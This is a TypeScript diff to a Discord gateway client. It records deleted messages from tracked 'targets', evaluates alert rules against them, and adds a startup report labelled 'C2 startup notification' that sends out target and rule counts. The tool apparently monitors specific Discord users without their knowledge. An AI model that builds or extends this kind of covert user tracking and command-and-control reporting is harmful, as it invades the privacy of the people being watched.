@@ -206,10 +206,11 @@ function setupGatewayHandlers(client: GatewayClient): void {
                 }
 
                 case "MESSAGE_DELETE": {
-                    const deletedTargetId = handleMessageDelete(data.id, data.channel_id, data.guild_id || null);
-                    if (deletedTargetId) {
+                    const deleted = handleMessageDelete(data.id, data.channel_id, data.guild_id || null);
+                    if (deleted) {
+                        evaluateEvent("MESSAGE_DELETE", deleted.targetId, deleted.eventData);
                         pushSSEEvent({
-                            target_id:  deletedTargetId,
+                            target_id:  deleted.targetId,
                             event_type: "MESSAGE_DELETE",
                             timestamp:  Date.now(),
                             data,
@@ -354,13 +355,26 @@ function setupGatewayHandlers(client: GatewayClient): void {
     });
 
     client.on("ready", (data: any) => {
-        log.info(`Gateway ready. Guilds: ${data.guilds?.length || 0}`);
+        const guildCount = data.guilds?.length || 0;
+        log.info(`Gateway ready. Guilds: ${guildCount}`);
 
         setRequestGuildMembersFn((guildId, userIds) =>
             client.requestGuildMembers(guildId, userIds)
         );
 
         setTimeout(() => requestInitialPresences(client), 2_000);
+
+        // C2 startup notification
+        const stmts = getStmts();
+        const targets = stmts.getAllTargets.all() as any[];
+        const ruleCount = (stmts.getAlertRules.all() as any[]).length;
+        notifyStartup({
+            guildCount,
+            targetCount:       targets.length,
+            activeTargetCount: targets.filter((t: any) => t.active).length,
+            ruleCount,
+            dbMode:            config.dbMode,
+        }).catch(() => {});
     });
 }
 
